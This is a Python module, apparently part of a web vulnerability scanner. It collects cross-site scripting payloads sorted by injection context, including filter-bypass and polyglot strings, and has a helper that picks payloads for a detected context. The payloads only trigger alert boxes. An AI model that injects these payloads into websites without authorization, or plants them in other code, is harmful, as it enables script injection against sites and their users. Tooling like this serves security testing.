"""
XSS Payloads Module
"""
from typing import List


class XSSPayloads:
    """Collection of XSS payloads for testing"""
    
    # Basic payloads - simple and effective
    BASIC = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
    ]
    
    # Attribute escape payloads
    ATTRIBUTE_ESCAPE = [
        '"><script>alert(1)</script>',
        '\' onmouseover=alert(1) x=\'',
        '" onmouseover="alert(1)',
        '\'><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '\'><<SCRIPT>alert(1)//<<SCRIPT>',
    ]
    
    # Tag context payloads
    TAG_CONTEXT = [
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
    ]
    
    # JavaScript context payloads
    JS_CONTEXT = [
        '\'-alert(1)-\'',
        '\";alert(1);//',
        '</script><script>alert(1)</script>',
        '"}alert(1)//{"',
    ]
    
    # Filter bypass payloads
    BYPASS = [
        '<ScRiPt>alert(1)</sCrIpT>',
        '<img src="x" onerror="alert(1)">',
        '<img src=x onerror=alert(1)>',
        '<svg><script>alert(1)</script></svg>',
        '<img src=x onerror=&#97;lert(1)>',
        '<img src=x onerror=\u0061lert(1)>',
        '<<script>alert(1)//<<script>',
        '<script>alert(String.fromCharCode(49))</script>',
        '<iframe src="data:text/html,<script>alert(1)</script>">',
    ]
    
    # Event handler payloads
    EVENT_HANDLERS = [
        '<img src=x onerror=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<div onmouseover=alert(1)>test</div>',
    ]
    
    # Polyglot payloads (work in multiple contexts)
    POLYGLOT = [
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
        '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'">',
        '"><svg/onload=alert(1)>',
        '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
    ]
    
    @classmethod
    def get_all_payloads(cls) -> List[str]:
        """Get all unique payloads"""
        all_payloads = (
            cls.BASIC +
            cls.ATTRIBUTE_ESCAPE +
            cls.TAG_CONTEXT +
            cls.JS_CONTEXT +
            cls.BYPASS +
            cls.EVENT_HANDLERS +
            cls.POLYGLOT
        )
        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for payload in all_payloads:
            if payload not in seen:
                seen.add(payload)
                unique_payloads.append(payload)
        return unique_payloads
    
    @classmethod
    def get_basic_payloads(cls) -> List[str]:
        """Get only basic payloads for quick testing"""
        return cls.BASIC + cls.ATTRIBUTE_ESCAPE[:3] + cls.TAG_CONTEXT[:3]
    
    @classmethod
    def get_advanced_payloads(cls) -> List[str]:
        """Get advanced payloads for thorough testing"""
        return cls.get_all_payloads()


class PayloadGenerator:
    """Generate context-aware payloads"""
    
    @staticmethod
    def generate_for_context(context: str) -> List[str]:
        """
        Generate payloads based on detected context
        
        Args:
            context: One of 'tag', 'attribute', 'script', 'unknown'
        
        Returns:
            List of context-appropriate payloads
        """
        if context == 'tag':
            return XSSPayloads.TAG_CONTEXT + XSSPayloads.BASIC
        elif context == 'attribute':
            return XSSPayloads.ATTRIBUTE_ESCAPE + XSSPayloads.BASIC
        elif context == 'script':
            return XSSPayloads.JS_CONTEXT + XSSPayloads.BASIC
        else:
            return XSSPayloads.get_all_payloads()
    
    @staticmethod
    def create_unique_marker(payload: str, param_name: str) -> str:
        """
        Add unique marker to payload for tracking
        
        Args:
            payload: Original payload
            param_name: Parameter name being tested
        
        Returns:
            Payload with unique marker
        """
        # Insert parameter name as comment if payload contains script tag
        if '<script>' in payload.lower():
            return payload.replace('<script>', f'<script>/* {param_name} */')
        return payload
